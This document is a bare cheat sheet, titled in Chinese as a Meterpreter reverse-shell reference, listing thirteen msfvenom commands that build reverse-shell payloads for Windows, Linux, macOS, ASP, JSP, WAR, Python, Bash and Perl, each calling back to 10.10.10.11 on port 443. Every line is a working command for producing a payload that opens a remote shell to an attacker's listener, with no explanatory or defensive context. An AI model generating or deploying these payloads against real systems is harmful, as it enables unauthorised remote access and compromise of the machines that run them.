# Meterpreter反弹Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe

```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe

```

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf

```

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf

```

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f elf > shell.elf

```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f exe > shell.exe

```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f macho > shell.macho

```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f asp > shell.asp

```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f raw > shell.jsp

```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f war > shell.war

```

```
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.11" LPORT=443 -f raw > shell.py

```

```
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.11" LPORT=443 -f raw > shell.sh

```

```
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.11" LPORT=443 -f raw > shell.pl

```

